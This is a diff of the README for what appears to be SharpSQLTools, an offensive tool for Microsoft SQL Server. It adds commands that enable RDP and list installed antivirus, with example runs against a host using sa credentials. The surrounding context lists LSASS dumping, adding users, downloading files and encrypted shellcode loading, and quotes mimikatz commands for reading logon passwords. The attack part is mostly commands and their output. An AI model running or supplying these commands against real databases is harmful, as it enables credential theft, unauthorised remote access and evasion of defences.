@@ -41,6 +41,8 @@ disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
 clr_dumplsass              - dumplsass by clr
+clr_rdp                    - check RDP port and Enable RDP
+clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
 clr_download {url} {path}  - download file from url by clr
 clr_scloader {code} {key}  - Encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
@@ -121,7 +123,24 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] Use "sekurlsa::minidump debug.out" "sekurlsa::logonPasswords full" on the same OS/arch
 ```
 
+### clr_RDP
 
+```
+λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX "clr_RDP"
+[*] Database connection is successful!
+[*] RDP is already enabled
+[+] RDP Port: 3389
+```
+
+### clr_getav
+
+```
+λ SharpSQLTools.exe 192.168.0.103 sa 1qaz@WSX "clr_getav"
+[*] Database connection is successful!
+[*] Finding....
+   [>] proName: wdswfsafe appName: 360杀毒-网盾
+[*] Finish!
+```
 
 #### clr_adduser
 
@@ -177,3 +196,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 ### References
 
 https://github.com/blackarrowsec/mssqlproxy
+
+https://github.com/An0nySec/ShadowUser/blob/main/ShadowUser/Program.cs#L235
+
+https://github.com/GhostPack/SharpDump
